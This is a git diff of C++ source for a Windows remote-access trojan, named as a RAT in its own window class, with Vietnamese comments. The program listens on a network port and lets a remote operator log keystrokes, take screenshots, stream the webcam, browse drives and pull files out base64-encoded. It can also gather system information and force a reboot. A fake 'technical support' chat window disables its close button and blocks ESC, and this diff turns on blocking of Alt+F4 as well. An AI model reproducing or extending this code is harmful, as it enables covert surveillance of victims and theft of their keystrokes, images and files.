@@ -60,18 +60,13 @@ static string toUtf8(const char *str)
     return string(str);
 }
 
-// 2. Phiên bản xử lý chuỗi Unicode (wchar_t*) - Dành cho Module Chat
 static string toUtf8(const wchar_t *wstr)
 {
     if (!wstr)
         return string();
-
-    // Tính toán độ dài bộ đệm cần thiết
     int size = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, nullptr, 0, nullptr, nullptr);
     if (size <= 0)
         return string();
-
-    // Chuyển đổi
     vector<char> buffer(size);
     WideCharToMultiByte(CP_UTF8, 0, wstr, -1, buffer.data(), size, nullptr, nullptr);
 
@@ -185,7 +180,6 @@ void restart()
     system("shutdown /r /t 0");
 }
 
-// Keylogger Implementation
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
     if (nCode >= 0 && wParam == WM_KEYDOWN && isKeylogActive)
@@ -333,22 +327,16 @@ void hookKey()
 
 void unhookKey()
 {
-    // 1. Gửi lệnh dừng cho thread
     if (isKeylogActive && keylogThreadId != 0)
     {
         PostThreadMessage(keylogThreadId, WM_QUIT, 0, 0);
     }
-
-    // 2. [MỚI] Chờ cho đến khi biến isKeylogActive về false
-    // (Biến này được set về false ở cuối hàm startKeyLogger)
     int timeout = 0;
     while (isKeylogActive && timeout < 20)
-    { // Chờ tối đa 2 giây (20 * 100ms)
+    {
         Sleep(100);
         timeout++;
     }
-
-    // Đề phòng trường hợp kẹt
     isKeylogActive = false;
 }
 
@@ -400,7 +388,7 @@ void keylog()
     }
 }
 
-// Screenshot Function
+
 void takepic()
 {
     string ss;
@@ -928,26 +916,22 @@ void webcam()
             {
                 streaming = true;
                 sendLine("OK");
-
-                // Đánh dấu thread đang chạy
                 isWebcamThreadRunning = true;
 
                 thread streamThread([&]()
                                     {
-                    // ... (Code khởi tạo giữ nguyên) ...
+
                     hCapture = capCreateCaptureWindowA("WebcamCap", WS_POPUP, 0, 0, 640, 480, NULL, 0);
-                    
-                    // ... (Code kết nối driver giữ nguyên) ...
+
                     if (!hCapture || !SendMessage(hCapture, WM_CAP_DRIVER_CONNECT, 0, 0)) {
                         if(hCapture) DestroyWindow(hCapture);
                         hCapture = NULL;
                         streaming = false;
                         sendLine("STOPPED");
-                        isWebcamThreadRunning = false; // [QUAN TRỌNG] Báo thread đã chết
+                        isWebcamThreadRunning = false; 
                         return;
                     }
 
-                    // ... (Code setup bitmap giữ nguyên) ...
                     BITMAPINFO bmpInfo = {0};
                     bmpInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
                     bmpInfo.bmiHeader.biWidth = 640;
@@ -972,7 +956,6 @@ void webcam()
                         SendMessage(hCapture, WM_CAP_GRAB_FRAME_NOSTOP, 0, 0);
                     }
                     
-                    // Dọn dẹp
                     if (hCapture) {
                         SendMessage(hCapture, WM_CAP_SET_CALLBACK_FRAME, 0, 0);
                         SendMessage(hCapture, WM_CAP_DRIVER_DISCONNECT, 0, 0);
@@ -980,7 +963,6 @@ void webcam()
                         hCapture = NULL;
                     }
                     
-                    // [QUAN TRỌNG] Báo hiệu thread đã kết thúc hoàn toàn
                     isWebcamThreadRunning = false; });
                 streamThread.detach();
             }
@@ -999,12 +981,10 @@ void webcam()
         }
         else if (cmd == "QUIT")
         {
-            // [LOGIC SỬA LỖI]: Ép buộc dừng và CHỜ
+         
             streaming = false;
             isRecording = false;
 
-            // Vòng lặp chờ chủ động: Chừng nào thread webcam chưa chết, ta chưa thoát
-            // Việc này đảm bảo khi sang tab Chat, webcam đã sạch sẽ 100%
             while (isWebcamThreadRunning)
             {
                 Sleep(50);
@@ -1035,30 +1015,28 @@ void fileManagement()
 
         if (cmd == "LIST") {
             string path;
-            receiveSignal(path); // Nhận path từ client (dạng string)
+            receiveSignal(path); 
             sendLine("FILELIST");
 
-            // Chuyển path sang Unicode và thêm "*"
             wstring wPath = toWide(path);
             if (!wPath.empty() && wPath.back() != L'\\') wPath += L"\\";
             wstring wSearchPath = wPath + L"*";
 
-            WIN32_FIND_DATAW findData; // Dùng bản W
-            HANDLE hFind = FindFirstFileW(wSearchPath.c_str(), &findData); // Dùng bản W
+            WIN32_FIND_DATAW findData; 
+            HANDLE hFind = FindFirstFileW(wSearchPath.c_str(), &findData); 
 
             if (hFind != INVALID_HANDLE_VALUE) {
                 do {
                     wstring wName = findData.cFileName;
                     if (wName == L"." || wName == L"..") continue;
 
-                    // Chuyển tên file từ Unicode (wchar_t) sang UTF-8 để gửi qua Socket
-                    string name = toUtf8(wName.c_str()); // Dùng hàm toUtf8(const wchar_t*) đã có
+                    string name = toUtf8(wName.c_str()); 
                     
                     string type = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "DIR" : "FILE";
                     ULONGLONG fileSize = ((ULONGLONG)findData.nFileSizeHigh << 32) | findData.nFileSizeLow;
 
                     string line = type + "|" + name + "|" + to_string(fileSize);
-                    sendLine(line); // Gửi chuỗi đã là UTF-8 chuẩn
+                    sendLine(line); 
                 } while (FindNextFileW(hFind, &findData));
                 FindClose(hFind);
             }
@@ -1067,7 +1045,6 @@ void fileManagement()
         {
             sendLine("DRIVELIST");
 
-            // Liệt kê tất cả ổ đĩa
             DWORD drives = GetLogicalDrives();
             for (char c = 'A'; c <= 'Z'; c++)
             {
@@ -1080,17 +1057,15 @@ void fileManagement()
         }
         else if (cmd == "DOWNLOAD")
         {
-            // Nhận đường dẫn file
+       
             string filePath;
             receiveSignal(filePath);
 
             cout << "[FILE DOWNLOAD] Request: " << filePath << endl;
 
-            // Đọc file
             ifstream file(filePath, ios::binary | ios::ate);
             if (file.is_open())
             {
-                // Lấy kích thước file
                 size_t fileSize = file.tellg();
                 file.seekg(0, ios::beg);
 
@@ -1108,8 +1083,6 @@ void fileManagement()
                     file.close();
 
                     cout << "[FILE DOWNLOAD] Read complete, encoding..." << endl;
-
-                    // Mã hóa Base64 (dùng CryptBinaryToStringA)
                     DWORD base64Size = 0;
                     if (!CryptBinaryToStringA((BYTE *)buffer.data(), fileSize,
                                               CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
@@ -1120,7 +1093,6 @@ void fileManagement()
                     }
                     else
                     {
-                        // Cấp phát đủ chỗ cho base64 string
                         vector<char> base64(base64Size);
                         if (!CryptBinaryToStringA((BYTE *)buffer.data(), fileSize,
                                                   CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
@@ -1133,9 +1105,7 @@ void fileManagement()
                         {
                             cout << "[FILE DOWNLOAD] Encoded size: " << base64Size << " chars" << endl;
 
-                            // Gửi header + data
                             sendLine("FILEDATA " + to_string(fileSize));
-                            // CryptBinaryToStringA trả về base64Size ĐÃ KHÔNG BAO GỒM null terminator
                             string b64str(base64.data(), base64Size);
                             sendLine(b64str);
 
@@ -1174,7 +1144,6 @@ string getRegString(HKEY root, const char *path, const char *valueName)
     return result;
 }
 
-// Hàm chuyển đổi Bytes -> GB
 string bytesToGB(unsigned long long bytes)
 {
     double gb = (double)bytes / (1024 * 1024 * 1024);
@@ -1183,7 +1152,6 @@ string bytesToGB(unsigned long long bytes)
     return ss.str();
 }
 
-// Hàm chính: Thu thập và gửi thông tin
 void getSystemInfo()
 {
     char buffer[256];
@@ -1240,94 +1208,71 @@ LRESULT CALLBACK EditSubclassProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lPa
 {
     if (msg == WM_KEYDOWN && wParam == VK_RETURN)
     {
-        // Nếu ấn Enter -> Giả lập bấm nút Gửi (ID = 1) của cửa sổ cha
         SendMessage(GetParent(hwnd), WM_COMMAND, 1, 0);
-        return 0; // Đã xử lý xong, không truyền tiếp
+        return 0;
     }
-    // Các phím khác (bao gồm gõ tiếng Việt) để mặc định xử lý
     return CallWindowProcW(oldEditProc, hwnd, msg, wParam, lParam);
 }
 HHOOK hBlockHook = NULL;
 
-// Hàm xử lý Hook: Chặn phím ESC
 LRESULT CALLBACK BlockEscProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
     if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
     {
         KBDLLHOOKSTRUCT *pKey = (KBDLLHOOKSTRUCT *)lParam;
 
-        // Nếu phím bấm là ESC
         if (pKey->vkCode == VK_ESCAPE)
         {
-            return 1; // Trả về 1 để CHẶN, không cho Windows xử lý tiếp
+            return 1; 
         }
-
-        // (Tùy chọn) Chặn thêm Alt + F4 để không cho tắt cửa sổ
-        // if (pKey->vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) {
-        //     return 1;
-        // }
+        if (pKey->vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) {
+            return 1;
+        }
     }
     return CallNextHookEx(hBlockHook, nCode, wParam, lParam);
 }
 
-// Xử lý sự kiện cửa sổ Chat
 LRESULT CALLBACK ChatWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
     switch (msg)
     {
     case WM_CREATE:
     {
-        // 1. Tạo giao diện
         hChatHistory = CreateWindowW(L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY | WS_BORDER, 10, 10, 360, 300, hwnd, NULL, NULL, NULL);
         hChatInput = CreateWindowW(L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL, 10, 320, 260, 30, hwnd, NULL, NULL, NULL);
         hBtnSend = CreateWindowW(L"BUTTON", L"Gửi", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 280, 320, 90, 30, hwnd, (HMENU)1, NULL, NULL);
-
-        // 2. Set Font (Dùng font hệ thống để hiển thị Tiếng Việt tốt hơn)
         HFONT hFont = (HFONT)GetStockObject(DEFAULT_GUI_FONT);
         SendMessage(hChatHistory, WM_SETFONT, (WPARAM)hFont, TRUE);
         SendMessage(hChatInput, WM_SETFONT, (WPARAM)hFont, TRUE);
         SendMessage(hBtnSend, WM_SETFONT, (WPARAM)hFont, TRUE);
-
-        // 3. [MỚI] Vô hiệu hóa nút đóng (X) trên thanh tiêu đề
         HMENU hMenu = GetSystemMenu(hwnd, FALSE);
         if (hMenu)
         {
             EnableMenuItem(hMenu, SC_CLOSE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
         }
-
-        // 4. [MỚI] Gắn Hook (Subclass) cho ô Input để bắt phím Enter
-        // SetWindowLongPtrW dùng cho cả x86 và x64
         oldEditProc = (WNDPROC)SetWindowLongPtrW(hChatInput, GWLP_WNDPROC, (LONG_PTR)EditSubclassProc);
-
-        // Focus ngay vào ô nhập liệu
         SetFocus(hChatInput);
         break;
     }
 
     case WM_COMMAND:
         if (LOWORD(wParam) == 1)
-        { // Nút Gửi (hoặc Enter từ EditSubclassProc)
+        { 
             int len = GetWindowTextLengthW(hChatInput);
             if (len > 0)
             {
                 vector<wchar_t> buf(len + 1);
                 GetWindowTextW(hChatInput, buf.data(), len + 1);
                 wstring txt(buf.data());
-
-                // Gửi về Web
                 string utf8Msg = "CHAT:[Server]: " + toUtf8(txt.c_str());
                 sendLine(utf8Msg);
-
-                // Hiện lên màn hình Server
                 appendChatLog(L"[Me]: " + txt);
                 SetWindowTextW(hChatInput, L"");
             }
         }
         break;
-
-    // [QUAN TRỌNG] Chặn người dùng đóng cửa sổ
     case WM_CLOSE:
-        ShowWindow(hwnd, SW_HIDE); // Chỉ ẩn cửa sổ đi
+        ShowWindow(hwnd, SW_HIDE); 
         return 0;
 
     case WM_DESTROY:
@@ -1340,7 +1285,6 @@ LRESULT CALLBACK ChatWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
     return 0;
 }
 
-// Luồng chạy giao diện Chat
 void chatGuiThread()
 {
     WNDCLASSW wc = {0};
@@ -1349,18 +1293,13 @@ void chatGuiThread()
     wc.hInstance = GetModuleHandle(NULL);
     wc.lpszClassName = L"RatChatClass";
     wc.lpfnWndProc = ChatWndProc;
-
-    // Đăng ký class, nếu lỗi (do đã đăng ký) thì bỏ qua
     RegisterClassW(&wc);
 
     hChatWnd = CreateWindowW(L"RatChatClass", L"Hỗ trợ kỹ thuật",
                              WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
                              CW_USEDEFAULT, CW_USEDEFAULT, 400, 400, NULL, NULL, GetModuleHandle(NULL), NULL);
 
-    // Chặn ESC
     hBlockHook = SetWindowsHookEx(WH_KEYBOARD_LL, BlockEscProc, GetModuleHandle(NULL), 0);
-
-    // Vòng lặp tin nhắn (Dùng bản W)
     MSG msg;
     while (GetMessageW(&msg, NULL, 0, 0))
     {
@@ -1369,22 +1308,21 @@ void chatGuiThread()
     }
 }
 
-// Hàm logic chính được gọi từ vòng lặp lệnh
 void chatModule()
 {
-    // 1. Nếu GUI chưa từng chạy, hãy khởi tạo nó
+
     if (isGuiRunning && !IsWindow(hChatWnd))
     {
-        isGuiRunning = false; // Cửa sổ đã bị đóng, đánh dấu lại
+        isGuiRunning = false;
         hChatWnd = NULL;
     }
     if (!isGuiRunning)
     {
         isGuiRunning = true;
         thread gui(chatGuiThread);
-        gui.detach(); // Tách luồng để nó chạy độc lập
+        gui.detach(); 
         while (!hChatWnd)
-            Sleep(50); // Đợi cửa sổ tạo xong
+            Sleep(50);
     }
 
     string cmd;
@@ -1394,7 +1332,6 @@ void chatModule()
 
         if (cmd == "START")
         {
-            // Hiện cửa sổ lên (Tái sử dụng)
             if (hChatWnd)
             {
                 ShowWindowAsync(hChatWnd, SW_RESTORE);
@@ -1406,7 +1343,6 @@ void chatModule()
         }
         else if (cmd.rfind("MSG|", 0) == 0)
         {
-            // Nhận tin nhắn
             string content = cmd.substr(4);
             int size_needed = MultiByteToWideChar(CP_UTF8, 0, &content[0], (int)content.size(), NULL, 0);
             wstring wstrTo(size_needed, 0);
@@ -1415,8 +1351,6 @@ void chatModule()
         }
         else if (cmd == "QUIT")
         {
-            // [QUAN TRỌNG] Ẩn cửa sổ và thoát khỏi hàm chatModule
-            // Để trả quyền điều khiển về cho vòng lặp chính (processClient)
             if (hChatWnd)
                 ShowWindow(hChatWnd, SW_HIDE);
             return;
@@ -1507,14 +1441,11 @@ int main()
 
     cout << "Server listening on port 5656..." << endl;
 
-    // VÒNG LẶP VÔ TẬN: Chấp nhận kết nối -> Xử lý -> Lặp lại
     while (true)
     {
         SOCKET client = accept(serverSocket, NULL, NULL);
         if (client != INVALID_SOCKET)
         {
-            // Xử lý client (Blocking)
-            // Khi client thoát, hàm này return, vòng lặp while tiếp tục đón client mới
             processClient(client);
             closesocket(client);
         }
